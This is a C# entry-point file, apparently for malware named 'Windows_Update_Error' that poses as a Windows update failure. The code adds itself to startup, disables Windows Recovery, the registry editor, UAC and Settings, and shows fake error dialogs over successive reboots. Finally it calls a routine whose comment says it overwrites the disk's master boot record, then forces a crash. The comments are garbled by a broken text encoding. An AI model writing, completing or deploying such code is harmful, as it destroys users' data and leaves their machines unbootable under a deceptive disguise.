using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;

namespace Windows_Update_Error
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            Regedit_Set regedit1 = new Regedit_Set();      //����Regedit_Set����
            Test test1 = new Test();          //����Test����
            string regedit1_Start = regedit1.Start_Detection();         //��ȡ������
            const string str1 = "114514";
            const string str2 = "8479838";
            const string str3 = "7453567";
            const string str4 = "84634846";
            const string str5 = "847327473";
            try
            {
                regedit1.PC_Start();         //��ӿ���������޸�ϵͳ�ؼ�������
                test1.Disable_WinRE();      //����Windows�ָ�����
                regedit1.Disable_Regedit();           //����ע���
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            regedit1.UAC_OFF();         //�ر�UAC
            regedit1.Disable_Settings();   //�������ú����������
            Thread.Sleep(5000);       //�ȴ�5��
            switch(regedit1_Start)
            {
                case str1:
                    regedit1_Start = "8479838";
                    regedit1.Start_Update(regedit1_Start);     //����������
                    test1.Shutdown_PC();      //����
                    break;
                case str2:
                    regedit1_Start = regedit1.Start_Detection();    //��ȡ������
                    regedit1_Start = "7453567";
                    regedit1.Start_Update(regedit1_Start);
                    msg1();
                    Application.Run(new Form2());
                    break;
                case str3:
                    regedit1_Start = regedit1.Start_Detection();     //��ȡ������
                    regedit1_Start = "84634846";
                    regedit1.Start_Update(regedit1_Start);     //����������
                    msg2();
                    Application.Run(new Form2());
                    break;
                case str4:
                    regedit1_Start = regedit1.Start_Detection();       //��ȡ������
                    regedit1_Start = "847327473";
                    regedit1.Start_Update(regedit1_Start);          //����������
                    msg3();
                    Application.Run(new Form2());
                    break;
                case str5:
                    test1.killmbrA();     //�۸�Ӳ�̵���������¼MBR
                    //test1.killmbr();
                    test1.Nt_Error();     //����
                    break;
                default:
                    test1.killmbrA();     //�۸�Ӳ�̵���������¼MBR
                    //test1.killmbr();
                    test1.Nt_Error();     //����
                    break;
            }
            void msg1()
            {
                MessageBox.Show("����ʧ�ܣ�Windows�޷��޸���ĵ���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg2()
            {
                MessageBox.Show("����������δ֪�����޷���������Windows���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg3()
            {
                MessageBox.Show("�����޷��ָ���Ҫ��Windows���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}